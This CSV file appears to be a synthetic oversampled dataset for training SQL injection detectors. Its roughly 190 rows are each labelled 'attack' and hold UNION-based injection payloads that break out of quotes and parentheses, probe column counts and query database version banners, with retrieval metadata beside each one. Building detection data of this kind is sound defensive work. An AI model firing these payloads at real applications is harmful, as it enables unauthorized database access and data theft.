id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance
SMOTE_000187,attack,union," select * from users where id  =  '1' union select +\#,@@VERSION -- 1'",nearest_attack_euclidean,R000112,0.5274192022830894
SMOTE_000188,attack,union," select * from users where id  =  '1' or @  (  1  )    =  1 union select 1,version  (    )   -- 1'",nearest_attack_euclidean,R000141,0.08193124399536117
SMOTE_000189,attack,union,"1'+  (  select 'tzey' where 4491  =  4491 union all select null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000553,0.3410950107173404
SMOTE_000190,attack,union," select * from users where id  =  1 +$+ union select null,@@VERSION -- 1",nearest_attack_euclidean,R000119,0.2944090193776684
SMOTE_000191,attack,union,"-8760"" union all select 2309,2309,2309,2309,2309,2309,2309,2309,2309#",nearest_attack_euclidean,R000246,0.0
SMOTE_000192,attack,union,"1""   )    )    as hdyn where 6027  =  6027 union all select null,null,null--",nearest_attack_euclidean,R000293,0.013377588045805905
SMOTE_000193,attack,union,"-8760"" union all select 2309,2309,2309,2309,2309,2309,2309,2309,2309#",nearest_attack_euclidean,R000246,0.3899986523812224
SMOTE_000194,attack,union,"-9922'   )    )    union all select 2193,2193,2193--",nearest_attack_euclidean,R000397,0.26204880629249067
SMOTE_000195,attack,union,"-9932"" union all select 4049,4049,4049--",nearest_attack_euclidean,R000482,0.4116984348023518
SMOTE_000196,attack,union,"-7813""   )    )    as yvyl where 5172  =  5172 union all select 5172,5172#",nearest_attack_euclidean,R000182,0.2483697030395729
SMOTE_000197,attack,union,"-3151%""   )    )     )   union all select 6250,6250,6250,6250,6250,6250,6250,6250,6250,6250#",nearest_attack_euclidean,R000532,0.0987511613195087
SMOTE_000198,attack,union," select * from users where id  =  1.&&@ union select 1,version  (    )   -- 1",nearest_attack_euclidean,R000132,0.10316730206383626
SMOTE_000199,attack,union,-5389'||  (  select 'gggl' where 1020  =  1020 union all select 1020#,nearest_attack_euclidean,R000622,0.16024033138376118
SMOTE_000200,attack,union,"1' in boolean mode  )   union all select null,null,null,null,null,null,null,null,null#",nearest_attack_euclidean,R000197,0.10944187881428297
SMOTE_000201,attack,union,"-7422"" union all select 9127,9127,9127,9127,9127,9127,9127,9127,9127,9127#",nearest_attack_euclidean,R000601,0.06651545539391969
SMOTE_000202,attack,union,"1'||  (  select 'aair' where 9234  =  9234 union all select null,null,null,null#",nearest_attack_euclidean,R000650,0.2894104091734262
SMOTE_000203,attack,union,-4058  )   union all select 9184--,nearest_attack_euclidean,R000439,0.10291830180065664
SMOTE_000204,attack,union,"-1641'||  (  select 'jfnu' where 7682  =  7682 union all select 7682,7682,7682--",nearest_attack_euclidean,R000248,0.1702074029113321
SMOTE_000205,attack,union," select * from users where id  =  1 union select 1,banner from v$version where rownum  =  1 -- 1",nearest_attack_euclidean,R000013,0.08262180766167365
SMOTE_000206,attack,union,"1""   )    )    as tjdz where 8656  =  8656 union all select null,null,null,null,null--",nearest_attack_euclidean,R000403,0.2874237057756905
SMOTE_000207,attack,union,"-6017 union all select 8449,8449,8449--",nearest_attack_euclidean,R000777,0.2247625843452051
SMOTE_000208,attack,union,"-3116""   )    )     )   union all select 4600,4600,4600,4600--",nearest_attack_euclidean,R000605,0.10854292143264059
SMOTE_000209,attack,union,"-9507%"" union all select 3342,3342,3342,3342,3342#",nearest_attack_euclidean,R000679,1.0047191573586491
SMOTE_000210,attack,union," select * from users where id  =  1 *\. union select null,@@VERSION -- 1",nearest_attack_euclidean,R000054,0.002031945886626576
SMOTE_000211,attack,union," select * from users where id  =  1 +$ . union select null,@@VERSION -- 1",nearest_attack_euclidean,R000042,0.352543928957648
SMOTE_000212,attack,union," select * from users where id  =  11<1# union select 1,version  (    )   -- 1",nearest_attack_euclidean,R000060,0.32181105528447973
SMOTE_000213,attack,union,"-7963'+  (  select 'kxzh' where 7039  =  7039 union all select 7039,7039,7039,7039,7039,7039--",nearest_attack_euclidean,R000766,0.46024844366264117
SMOTE_000214,attack,union,"-6377'||  (  select 'ryin' where 2113  =  2113 union all select 2113,2113,2113#",nearest_attack_euclidean,R000473,0.1359329385831356
SMOTE_000215,attack,union,"-3860' union all select 3510,3510,3510#",nearest_attack_euclidean,R000405,0.24913645117127547
SMOTE_000216,attack,union,"-2153'||  (  select 'sofs' where 4126  =  4126 union all select 4126,4126,4126,4126,4126#",nearest_attack_euclidean,R000567,0.1070416435893125
SMOTE_000217,attack,union,"1'||  (  select 'yaii' from dual where 7317  =  7317 union all select null,null,null,null,null,null,null,null,null#",nearest_attack_euclidean,R000384,0.7820255236766934
SMOTE_000218,attack,union,"-2254'  )   as dyrv where 9079  =  9079 union all select 9079,9079,9079,9079,9079,9079,9079,9079#",nearest_attack_euclidean,R000475,0.49497266710023374
SMOTE_000219,attack,union,"-6405  )   as ilah where 5145  =  5145 union all select 5145,5145,5145,5145,5145--",nearest_attack_euclidean,R000554,0.0629157486639494
SMOTE_000220,attack,union,"-2725"" union all select 3671,3671,3671,3671,3671#",nearest_attack_euclidean,R000582,0.4212957070710317
SMOTE_000221,attack,union,"-6186' in boolean mode  )   union all select 2990,2990,2990#",nearest_attack_euclidean,R000676,0.3835953078968641
SMOTE_000222,attack,union,"-3347'+  (  select xuzs where 1076  =  1076 union all select 1076,1076,1076,1076,1076--",nearest_attack_euclidean,R000325,0.12619229653091565
SMOTE_000223,attack,union,"-9566%""  )   union all select 7973,7973,7973,7973--",nearest_attack_euclidean,R000348,0.5096877370343256
SMOTE_000224,attack,union,"-7460"" union all select 4273,4273,4273,4273,4273,4273,4273,4273#",nearest_attack_euclidean,R000316,0.03646234992886536
SMOTE_000225,attack,union,"-8684 union all select 9519,9519,9519,9519--",nearest_attack_euclidean,R000515,0.5806936366401573
SMOTE_000226,attack,union,"-2382%'  )   union all select 8885,8885,8885,8885,8885,8885,8885#",nearest_attack_euclidean,R000652,0.37295232887473917
SMOTE_000227,attack,union,"-9405'  )   union all select 8283,8283,8283,8283--",nearest_attack_euclidean,R000543,0.11922209068204444
SMOTE_000228,attack,union," select * from users where id  =  '1' or !<1 union select 1,version  (    )   -- 1'",nearest_attack_euclidean,R000088,0.4261161724936265
SMOTE_000229,attack,union,"-3719"" union all select 6609,6609,6609,6609#",nearest_attack_euclidean,R000399,0.3304618961995662
SMOTE_000230,attack,union,"-7824""   )    )     )   union all select 3800,3800,3800,3800,3800,3800,3800,3800,3800--",nearest_attack_euclidean,R000361,0.06444513963644838
SMOTE_000231,attack,union,"-4860'  )   as azyx where 6901  =  6901 union all select 6901,6901,6901,6901,6901#",nearest_attack_euclidean,R000177,0.08374605009507229
SMOTE_000232,attack,union,"1  )   as nkjo where 8462  =  8462 union all select null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000458,0.23820767218670252
SMOTE_000233,attack,union,"1""  )   as drrx where 8633  =  8633 union all select null,null,null--",nearest_attack_euclidean,R000418,0.21431434697754184
SMOTE_000234,attack,union,"1' in boolean mode  )   union all select null,null,null,null,null,null#",nearest_attack_euclidean,R000422,0.22620530400064373
SMOTE_000235,attack,union,"-6775"" union all select 7484,7484#",nearest_attack_euclidean,R000630,0.4477813451130068
SMOTE_000236,attack,union,"-5225'   )    )    as zats where 5629  =  5629 union all select 5629,5629,5629,5629,5629--",nearest_attack_euclidean,R000319,0.7414013903030688
SMOTE_000237,attack,union,"-6108'  )   union all select 2519,2519,2519,2519--",nearest_attack_euclidean,R000449,0.16642879069699434
SMOTE_000238,attack,union,"-5396'||  (  select 'fjhd' from dual where 4019  =  4019 union all select 4019,4019,4019,4019#",nearest_attack_euclidean,R000455,0.5734957818454232
SMOTE_000239,attack,union,"-7815' union all select 2638,2638,2638,2638,2638--",nearest_attack_euclidean,R000639,0.18000587057794062
SMOTE_000240,attack,union,"1'+  (  select ugvj where 2593  =  2593 union all select null,null,null,null,null#",nearest_attack_euclidean,R000502,1.0129586790405651
SMOTE_000241,attack,union,"-9145'  )   as xyya where 8950  =  8950 union all select 8950,8950,8950,8950,8950,8950,8950,8950--",nearest_attack_euclidean,R000359,0.1342202460126269
SMOTE_000242,attack,union,"1  )   as qzif where 7877  =  7877 union all select null,null,null,null,null,null,null--",nearest_attack_euclidean,R000709,0.13067120153815906
SMOTE_000243,attack,union,"1""  )   as hymr where 5497  =  5497 union all select null,null,null,null--",nearest_attack_euclidean,R000644,0.035964998218331296
SMOTE_000244,attack,union,"-3860' union all select 3510,3510,3510#",nearest_attack_euclidean,R000405,0.00015058421952426137
SMOTE_000245,attack,union,"-2441' union all select 1853,1853,1853,1853,1853,1853,1853--",nearest_attack_euclidean,R000624,0.014521748648537324
SMOTE_000246,attack,union,"-2430'  )   union all select 5712,5712,5712,5712,5712,5712,5712,5712,5712,5712--",nearest_attack_euclidean,R000719,0.012679339281081078
SMOTE_000247,attack,union," select * from users where id  =  1 union select @&&@,version  (    )   -- 1",nearest_attack_euclidean,R000176,0.02445823294636979
SMOTE_000248,attack,union,"-5225'   )    )    as zats where 5629  =  5629 union all select 5629,5629,5629,5629,5629--",nearest_attack_euclidean,R000319,0.8719133188018067
SMOTE_000249,attack,union,"-4960 union all select 4031,4031#",nearest_attack_euclidean,R000295,0.5597870649546752
SMOTE_000250,attack,union,"-2359' union all select 2687,2687,2687#",nearest_attack_euclidean,R000528,0.2579460529071118
SMOTE_000251,attack,union," select * from users where id  =  '1' or \.<\ union select 1,@@VERSION -- 1'",nearest_attack_euclidean,R000003,0.03332692546898658
SMOTE_000252,attack,union,"-1653 union all select 8415,8415,8415,8415,8415,8415,8415,8415#",nearest_attack_euclidean,R000573,0.40336017195803336
SMOTE_000253,attack,union," select * from users where id  =  1 +$+ union select null,@@VERSION -- 1",nearest_attack_euclidean,R000119,0.39919604793498076
SMOTE_000254,attack,union," select * from users where id  =  1 *1 union select 1,banner from v$version where rownum  =  1 -- 1",nearest_attack_euclidean,R000018,0.40650524840934044
SMOTE_000255,attack,union,"-6086"" union all select 8700,8700,8700,8700--",nearest_attack_euclidean,R000496,0.03797881456444021
SMOTE_000256,attack,union,"-3391' union all select 2024,2024--",nearest_attack_euclidean,R000188,0.11569692268877244
SMOTE_000257,attack,union," select * from users where id  =  '1' union select @ 1,version  (    )   --  1'",nearest_attack_euclidean,R000081,0.21892377128600604
SMOTE_000258,attack,union,"-1891' in boolean mode  )   union all select 6680,6680,6680,6680,6680,6680,6680,6680#",nearest_attack_euclidean,R000207,0.25612183897397134
SMOTE_000259,attack,union,"1' in boolean mode  )   union all select null,null,null,null,null,null,null,null,null,null#",nearest_attack_euclidean,R000563,0.2758051642009802
SMOTE_000260,attack,union,"1' in boolean mode  )   union all select null,null,null,null,null,null,null,null,null#",nearest_attack_euclidean,R000197,0.07330918492768371
SMOTE_000261,attack,union,"-9941 union all select 1321,1321,1321,1321,1321,1321,1321#",nearest_attack_euclidean,R000288,0.30621837304499644
SMOTE_000262,attack,union,"-9997' union all select 9347,9347,9347,9347,9347,9347,9347,9347#",nearest_attack_euclidean,R000380,0.0033699991608398326
SMOTE_000263,attack,union,"-6368' union all select 6529,6529,6529--",nearest_attack_euclidean,R000340,0.6405778942774386
SMOTE_000264,attack,union,"-9958""  )   as jzvq where 3741  =  3741 union all select 3741,3741,3741#",nearest_attack_euclidean,R000204,0.2947405137810746
SMOTE_000265,attack,union,"-5247"" union all select 3097,3097,3097,3097,3097,3097,3097#",nearest_attack_euclidean,R000252,0.350776698345746
SMOTE_000266,attack,union," select * from users where id  =  1.*\ union select null,@@VERSION -- 1",nearest_attack_euclidean,R000175,0.01616019183527717
SMOTE_000267,attack,union," select * from users where id  =  '1' union select @ 1,version  (    )   --  1'",nearest_attack_euclidean,R000081,0.005938757311012558
SMOTE_000268,attack,union," select * from users where id  =  '1' or $<\ union select 1,@@VERSION -- 1'",nearest_attack_euclidean,R000137,0.23879654344794143
SMOTE_000269,attack,union,"-7501'+  (  select uloc where 3089  =  3089 union all select 3089,3089,3089,3089,3089,3089,3089,3089,3089,3089--",nearest_attack_euclidean,R000273,0.07420193816318227
SMOTE_000270,attack,union,"-1171' union all select 3958,3958,3958,3958,3958--",nearest_attack_euclidean,R000233,0.35397129305424324
SMOTE_000271,attack,union,"-8005""  )   union all select 5213,5213,5213,5213,5213--",nearest_attack_euclidean,R000690,0.20581911089338775
SMOTE_000272,attack,union,"-6377'||  (  select 'ryin' where 2113  =  2113 union all select 2113,2113,2113#",nearest_attack_euclidean,R000473,0.2644066058930899
SMOTE_000273,attack,union," select * from users where id  =  1 +1 union select null,banner from v$version where rownum  =  1 -- 1",nearest_attack_euclidean,R000045,0.41883055510587214
SMOTE_000274,attack,union,"-5731"" union all select 3083,3083,3083#",nearest_attack_euclidean,R000481,0.2794808477602807
SMOTE_000275,attack,union,"-6667%""   )    )    union all select 7348,7348,7348,7348,7348,7348,7348,7348#",nearest_attack_euclidean,R000303,0.1307235189764633
SMOTE_000276,attack,union,"1'+  (  select yfuu where 1717  =  1717 union all select null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000317,0.034052746963760296
SMOTE_000277,attack,union,"-7611  )   as tuje where 6101  =  6101 union all select 6101,6101,6101,6101,6101,6101,6101,6101--",nearest_attack_euclidean,R000352,0.7224476225146234
SMOTE_000278,attack,union,"-9574'  )   as rxym where 4719  =  4719 union all select 4719,4719,4719,4719,4719,4719,4719--",nearest_attack_euclidean,R000425,0.060839474206268146
SMOTE_000279,attack,union," select * from users where id  =  1 +1 union select 1,banner from v$version where rownum  =  1 -- 1",nearest_attack_euclidean,R000078,1.1728084772933516
SMOTE_000280,attack,union,-4058  )   union all select 9184--,nearest_attack_euclidean,R000439,0.027582493109008566
SMOTE_000281,attack,union,"-5062""   )    )     )   union all select 4125,4125--",nearest_attack_euclidean,R000763,0.30748132266622763
SMOTE_000282,attack,union,"-4347' union all select 6074,6074,6074,6074,6074,6074,6074--",nearest_attack_euclidean,R000259,0.1503961447339185
SMOTE_000283,attack,union,"-7460"" union all select 4273,4273,4273,4273,4273,4273,4273,4273#",nearest_attack_euclidean,R000316,0.0
SMOTE_000284,attack,union," select * from users where id  =  1 or 1#""? union select version  (    )  ,version  (    )   -- 1",nearest_attack_euclidean,R000047,0.0
SMOTE_000285,attack,union,"-7941%'  )   union all select 6965,6965,6965,6965--",nearest_attack_euclidean,R000506,0.6498348278903381
SMOTE_000286,attack,union,"-2359' union all select 2687,2687,2687#",nearest_attack_euclidean,R000528,0.13517322088947725
SMOTE_000287,attack,union," select * from users where id  =  1 or 1#""{ union select 1,version  (    )   -- 1",nearest_attack_euclidean,R000043,1.287594541580551
SMOTE_000288,attack,union,"-6067'+  (  select 'bfhf' where 3114  =  3114 union all select 3114,3114,3114,3114,3114,3114,3114,3114--",nearest_attack_euclidean,R000576,0.16851702181168174
SMOTE_000289,attack,union,"-6527'   )    )    union all select 5053,5053,5053,5053--",nearest_attack_euclidean,R000522,0.4334487080098573
SMOTE_000290,attack,union," select * from users where id  =  1 union select 1a#,banner from v$version where rownum  =  1 -- 1",nearest_attack_euclidean,R000174,0.21922240363338966
SMOTE_000291,attack,union,"-7848%"" union all select 1580,1580,1580,1580,1580,1580,1580--",nearest_attack_euclidean,R000530,0.5990031935910481
SMOTE_000292,attack,union,"1'+  (  select unzl where 3432  =  3432 union all select null,null,null,null--",nearest_attack_euclidean,R000241,0.1901963034325921
SMOTE_000293,attack,union," select * from users where id  =  1 or 1#"".  =  1 union select 1,version  (    )   -- 1",nearest_attack_euclidean,R000127,0.0
SMOTE_000294,attack,union," select * from users where id  =  1 or 1#"". union select null,version  (    )   -- 1",nearest_attack_euclidean,R000012,6.322389769870168
SMOTE_000295,attack,union,"1'+  (  select 'gqsk' where 3087  =  3087 union all select null,null,null,null--",nearest_attack_euclidean,R000242,0.1397446630483881
SMOTE_000296,attack,union,"-2855' union all select 2495,2495,2495,2495,2495,2495,2495,2495,2495--",nearest_attack_euclidean,R000725,0.2904475331175393
SMOTE_000297,attack,union,"-1447"" union all select 3013,3013,3013,3013,3013,3013,3013--",nearest_attack_euclidean,R000606,0.21868439425162112
SMOTE_000298,attack,union,"-1681%"" union all select 8180,8180,8180,8180,8180,8180,8180,8180,8180,8180#",nearest_attack_euclidean,R000202,0.8070318504515426
SMOTE_000299,attack,union," select * from users where id  =  '1' or @ @1  =  1 union select 1,version  (    )   -- 1'",nearest_attack_euclidean,R000001,1.358958483032211
SMOTE_000300,attack,union,"-3017""   )    )    as ljit where 9128  =  9128 union all select 9128,9128,9128,9128,9128--",nearest_attack_euclidean,R000559,0.7500301919413335
SMOTE_000301,attack,union,"-9256""   )    )    union all select 2977,2977,2977,2977,2977,2977,2977--",nearest_attack_euclidean,R000635,0.11949714954755722
SMOTE_000302,attack,union,"-1510'   )    )     )   union all select 8755,8755,8755,8755,8755,8755,8755,8755,8755,8755--",nearest_attack_euclidean,R000551,0.009489012253376755
SMOTE_000303,attack,union,"-6789'||  (  select 'uckz' from dual where 2163  =  2163 union all select 2163,2163,2163,2163,2163,2163--",nearest_attack_euclidean,R000345,0.1825989443055591
SMOTE_000304,attack,union,"-2518' union all select 6818,6818,6818,6818,6818,6818#",nearest_attack_euclidean,R000769,0.22913220583667485
SMOTE_000305,attack,union,"-8215%""  )   union all select 3877,3877,3877,3877,3877,3877--",nearest_attack_euclidean,R000431,0.417952984811614
SMOTE_000306,attack,union,"-9795  )   as wrgs where 5427  =  5427 union all select 5427,5427,5427,5427,5427,5427--",nearest_attack_euclidean,R000183,0.8909221328603575
SMOTE_000307,attack,union,"-3116""   )    )     )   union all select 4600,4600,4600,4600--",nearest_attack_euclidean,R000605,0.05004812832514134
SMOTE_000308,attack,union,"-3860' union all select 3510,3510,3510#",nearest_attack_euclidean,R000405,0.39233150160264985
SMOTE_000309,attack,union,"-4756%'   )    )    union all select 7824,7824,7824,7824,7824,7824,7824,7824#",nearest_attack_euclidean,R000282,0.23715526255012126
SMOTE_000310,attack,union,"-8976%""   )    )     )   union all select 5146,5146,5146,5146,5146,5146,5146,5146--",nearest_attack_euclidean,R000536,0.4444554253352811
SMOTE_000311,attack,union,"-3343'||  (  select 'ssvt' where 5179  =  5179 union all select 5179,5179,5179,5179,5179,5179,5179,5179--",nearest_attack_euclidean,R000464,0.07789973380313012
SMOTE_000312,attack,union,"-6987' union all select 4721,4721--",nearest_attack_euclidean,R000615,0.06266139526202898
SMOTE_000313,attack,union,"-7409""   )    )    union all select 3145,3145,3145--",nearest_attack_euclidean,R000284,0.25109744627578834
SMOTE_000314,attack,union," select * from users where id  =  1 or 1#""? union select version  (    )  ,version  (    )   -- 1",nearest_attack_euclidean,R000047,0.0
SMOTE_000315,attack,union,"-2743 union all select 6757,6757,6757,6757,6757,6757--",nearest_attack_euclidean,R000398,0.2416834404698642
SMOTE_000316,attack,union," select * from users where id  =  1 or 1#"". union select 'a',version  (    )   -- 1",nearest_attack_euclidean,R000016,0.0
SMOTE_000317,attack,union,"-5776%' union all select 3075,3075,3075,3075,3075--",nearest_attack_euclidean,R000332,0.4507911245575413
SMOTE_000318,attack,union,"1'+  (  select gajr where 6653  =  6653 union all select null,null,null,null#",nearest_attack_euclidean,R000254,0.009551899176997508
SMOTE_000319,attack,union,"-3462   )    )    as biyl where 5143  =  5143 union all select 5143,5143,5143--",nearest_attack_euclidean,R000278,0.3051039250475754
SMOTE_000320,attack,union,"-3068%""   )    )    union all select 6597,6597,6597,6597,6597,6597,6597,6597--",nearest_attack_euclidean,R000581,0.6350826155686532
SMOTE_000321,attack,union,"-6778  )   as xutm where 6442  =  6442 union all select 6442,6442,6442,6442,6442,6442#",nearest_attack_euclidean,R000772,0.8186138113578859
SMOTE_000322,attack,union," select * from users where id  =  1 +1<@ union select null,version  (    )   -- 1",nearest_attack_euclidean,R000123,0.16759889532164216
SMOTE_000323,attack,union,"-6086"" union all select 8700,8700,8700,8700--",nearest_attack_euclidean,R000496,0.020188275650132953
SMOTE_000324,attack,union,"-8933  )   as iiyr where 1974  =  1974 union all select 1974,1974,1974,1974,1974#",nearest_attack_euclidean,R000741,0.5028387132424516
SMOTE_000325,attack,union,"1'+  (  select 'qvif' where 1758  =  1758 union all select null,null,null,null,null,null,null,null#",nearest_attack_euclidean,R000667,0.11469718097196424
SMOTE_000326,attack,union,"1'||  (  select 'jzwq' where 3289  =  3289 union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R000642,0.4426116304583678
SMOTE_000327,attack,union,"-4145%""   )    )    union all select 9404,9404,9404,9404,9404,9404,9404#",nearest_attack_euclidean,R000239,0.29188120665001915
SMOTE_000328,attack,union," select * from users where id  =  1 ||1 union select null,banner from v$version where rownum  =  1 -- 1",nearest_attack_euclidean,R000009,0.18750448986499443
SMOTE_000329,attack,union,"-9078 union all select 3779,3779,3779,3779,3779,3779,3779,3779--",nearest_attack_euclidean,R000589,0.05586722880430823
SMOTE_000330,attack,union,"-9606%""   )    )     )   union all select 8572,8572,8572,8572,8572,8572,8572,8572,8572--",nearest_attack_euclidean,R000460,0.44366018451109585
SMOTE_000331,attack,union,"-5810 union all select 6307,6307,6307,6307,6307,6307,6307--",nearest_attack_euclidean,R000518,0.008925844700252905
SMOTE_000332,attack,union,"-7869%' union all select 2406,2406,2406,2406,2406,2406,2406,2406#",nearest_attack_euclidean,R000718,0.13155451423806788
SMOTE_000333,attack,union,"-2701""   )    )    as wvht where 5401  =  5401 union all select 5401,5401,5401,5401,5401,5401,5401,5401#",nearest_attack_euclidean,R000301,0.5051583841472697
SMOTE_000334,attack,union," select * from users where id  =  1 +1 union select null,banner from v$version where rownum  =  1 -- 1",nearest_attack_euclidean,R000045,1.5891980256447582
SMOTE_000335,attack,union,"-6020'+  (  select isrz where 2489  =  2489 union all select 2489,2489,2489,2489,2489,2489,2489,2489--",nearest_attack_euclidean,R000754,0.12180225330842978
SMOTE_000336,attack,union,"-2855' union all select 2495,2495,2495,2495,2495,2495,2495,2495,2495--",nearest_attack_euclidean,R000725,0.3123782012863351
SMOTE_000337,attack,union,"-9837"" where 7201  =  7201 union all select 7201,7201,7201--",nearest_attack_euclidean,R000544,0.45995904709050756
SMOTE_000338,attack,union," select * from users where id  =  1 -@<@ union select null,version  (    )   -- 1",nearest_attack_euclidean,R000173,0.42837491583198734
SMOTE_000339,attack,union,"-8117' union all select 9945,9945,9945,9945,9945,9945,9945#",nearest_attack_euclidean,R000430,0.16361800803363036
SMOTE_000340,attack,union,"-2111' union all select 1061,1061,1061--",nearest_attack_euclidean,R000386,0.18444465286962042
SMOTE_000341,attack,union," select * from users where id  =  1 or \.<$ union select 1,@@VERSION -- 1",nearest_attack_euclidean,R000138,0.20100780542277605
SMOTE_000342,attack,union,"-6680%""   )    )    union all select 3719,3719,3719,3719,3719,3719,3719,3719,3719--",nearest_attack_euclidean,R000706,0.3218814993518604
SMOTE_000343,attack,union,"-7485""   )    )    as caob where 4100  =  4100 union all select 4100,4100,4100,4100,4100,4100,4100,4100--",nearest_attack_euclidean,R000286,0.7790208426871793
SMOTE_000344,attack,union,"-8588' union all select 2135,2135--",nearest_attack_euclidean,R000347,0.03381383881152442
SMOTE_000345,attack,union,"1' in boolean mode  )   union all select null,null,null,null,null,null,null,null,null,null#",nearest_attack_euclidean,R000563,1.4560202499055295
SMOTE_000346,attack,union,"-3071   )    )    as uiiu where 8910  =  8910 union all select 8910,8910,8910,8910,8910,8910,8910#",nearest_attack_euclidean,R000226,0.08968014140087609
SMOTE_000347,attack,union,"-8976%""   )    )     )   union all select 5146,5146,5146,5146,5146,5146,5146,5146--",nearest_attack_euclidean,R000536,0.3018220490205652
SMOTE_000348,attack,union,"-2518' union all select 6818,6818,6818,6818,6818,6818#",nearest_attack_euclidean,R000769,0.5164199679182357
SMOTE_000349,attack,union," select * from users where id  =  1 or \<\ union select null,@@VERSION -- 1",nearest_attack_euclidean,R000086,0.20673925426597417
SMOTE_000350,attack,union," select * from users where id  =  1<@.. union select 1,version  (    )   -- 1",nearest_attack_euclidean,R000031,0.0006426334807893456
SMOTE_000351,attack,union,"-3822""   )    )    as dftp where 2817  =  2817 union all select 2817,2817,2817,2817,2817,2817#",nearest_attack_euclidean,R000638,0.24663678342007714
SMOTE_000352,attack,union,"-7032'  )   as xmmm where 5635  =  5635 union all select 5635,5635,5635,5635,5635--",nearest_attack_euclidean,R000489,0.10609846069924647
SMOTE_000353,attack,union,"1'+  (  select lang where 4191  =  4191 union all select null,null#",nearest_attack_euclidean,R000491,0.3831599901695204
SMOTE_000354,attack,union,"-3393""   )    )    union all select 5954,5954,5954,5954,5954,5954,5954,5954,5954,5954--",nearest_attack_euclidean,R000584,0.3836126170073673
SMOTE_000355,attack,union,"-1653 union all select 8415,8415,8415,8415,8415,8415,8415,8415#",nearest_attack_euclidean,R000573,0.3907441609030434
SMOTE_000356,attack,union,"1'+  (  select 'tzey' where 4491  =  4491 union all select null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000553,0.4494354605923523
SMOTE_000357,attack,union," select * from users where id  =  1 or 1#""; union select 'a',version  (    )   -- 1",nearest_attack_euclidean,R000129,0.4750742739121255
SMOTE_000358,attack,union,"-1550' in boolean mode  )   union all select 9777,9777,9777--",nearest_attack_euclidean,R000612,0.7959587858066819
SMOTE_000359,attack,union," select * from users where id  =  1 or \<   =  1 union select 1,@@VERSION -- 1",nearest_attack_euclidean,R000036,0.300217894487649
SMOTE_000360,attack,union,"-2798'+  (  select 'emui' where 9565  =  9565 union all select 9565,9565,9565,9565--",nearest_attack_euclidean,R000761,0.5879525422204436
SMOTE_000361,attack,union," select * from users where id  =  '1' + @ @1 union select 1,version  (    )   -- 1'",nearest_attack_euclidean,R000091,0.41177722157779995
SMOTE_000362,attack,union,"-6186' in boolean mode  )   union all select 2990,2990,2990#",nearest_attack_euclidean,R000676,0.3385865810593743
SMOTE_000363,attack,union,"-6965'  )   union all select 2857,2857,2857,2857,2857,2857,2857,2857,2857,2857--",nearest_attack_euclidean,R000752,0.40290517401532766
SMOTE_000364,attack,union,"-1204'   )    )    union all select 3585,3585--",nearest_attack_euclidean,R000770,0.1835631693661196
SMOTE_000365,attack,union,"-2725"" union all select 3671,3671,3671,3671,3671#",nearest_attack_euclidean,R000582,0.2005764825406207
SMOTE_000366,attack,union,"-1998'  )   as kgvf where 2346  =  2346 union all select 2346,2346,2346,2346,2346,2346,2346,2346,2346--",nearest_attack_euclidean,R000268,0.22129160553234262
SMOTE_000367,attack,union,"-1236'+  (  select 'fbgh' where 3896  =  3896 union all select 3896,3896,3896,3896,3896,3896,3896,3896,3896--",nearest_attack_euclidean,R000263,0.32275364823428543
SMOTE_000368,attack,union,"1' in boolean mode  )   union all select null,null,null,null#",nearest_attack_euclidean,R000498,0.29946778788075973
SMOTE_000369,attack,union,"-5903%'  )   union all select 8293,8293,8293,8293,8293,8293,8293,8293#",nearest_attack_euclidean,R000629,0.38612245622637903
SMOTE_000370,attack,union,"-7661"" union all select 9551,9551,9551#",nearest_attack_euclidean,R000670,0.2086699207825259
SMOTE_000371,attack,union,"1'+  (  select kpso where 1226  =  1226 union all select null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000350,0.14003651245214999
SMOTE_000372,attack,union,"-2333' union all select 9714,9714,9714--",nearest_attack_euclidean,R000419,0.05932410850380478
SMOTE_000373,attack,union,"-5372""  )   as wlqm where 2432  =  2432 union all select 2432,2432,2432,2432,2432,2432#",nearest_attack_euclidean,R000324,0.43614897922102075
SMOTE_000374,attack,union,"-3179'+  (  select 'tzzz' where 3191  =  3191 union all select 3191,3191,3191,3191,3191#",nearest_attack_euclidean,R000265,0.1633088256367746
SMOTE_000375,attack,union," select * from users where id  =  1 or $+<1 union select 1,@@VERSION -- 1",nearest_attack_euclidean,R000022,0.008681914996670525
